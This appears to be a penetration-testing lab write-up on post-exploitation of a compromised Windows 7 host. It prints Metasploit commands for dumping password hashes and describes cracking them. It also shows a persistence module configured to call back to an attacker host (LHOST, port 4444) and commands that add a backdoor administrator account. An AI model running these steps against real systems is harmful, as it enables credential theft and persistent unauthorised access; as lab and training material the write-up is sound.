# Post-Exploitation

## Overview

In this step, we perform post-exploitation activities on the compromised Windows 7 system to gather further information and maintain access. We use tools like Metasploit and custom scripts to achieve this.

## Tools Used

- Metasploit
- Custom scripts

## Steps and Commands

### Gathering System Information

**Tool: Metasploit**
```bash
sysinfo
```
*Description: This command gathers basic system information from the compromised host.*

![Sysinfo Output](../04-Post-Exploitation/img1.png)

### Dumping Password Hashes

**Tool: Metasploit**

```bash
hashdump
```

*Description: This command dumps password hashes from the compromised host.*

![Hashdump Output](../04-Post-Exploitation/img2.png)


As shown in the image above, once a system is compromized, I was able to get the password hashes for all the users on the target system. What I did was to use a Password cracking tool called Ophcrack to crack these passwords and see their plaintext as shown below: 


![Hashdump Output](../04-Post-Exploitation/img3.png)


And after cracking the passwords, I was able to crack one of the accounts passwords as shown below:

![Hashdump Output](../04-Post-Exploitation/img4.png)


As shown above, the password for the test account was easy to brute force and was hence easily cracked. This was one easy way of cracking the password, I could of course have used other tools with wordlists to crack the passwords and this would be more sufficient and more appropriate in the industry.



### Persistence Techniques
After getting user accounts and passwords, the next step was to establish persistence on the target system, this ensures that when we are disconnected from the machine due to it being switched off or due to technical issues, we can always have a way back to the system. 

**Technique: Using the Persistence Exploit**
With this technique, I used the persistence exploit available in Metasploit

```bash
use exploit/windows/local/persistence
set SESSION <session_id>
set LHOST 192.168.88.252
set LPORT 4444
exploit

```


![Hashdump Output](../04-Post-Exploitation/img5.png)






**Technique: Adding a new user**

This technique works by adding new users to the compromized system, this allows us to have a way back to the system.

```bash
net user attacker password123 /add
net localgroup administrators attacker /add
```


![Hashdump Output](../04-Post-Exploitation/img5.png)

*Description: These commands create a new user and add them to the administrators group to maintain access.*

## Findings

- **System Information:** Summarize the gathered system information.
- **Password Hashes:** Discuss the retrieved password hashes and potential use for further exploitation.

## Recommendations

- Regularly monitor and audit user accounts.
- Implement strong password policies and use multi-factor authentication.
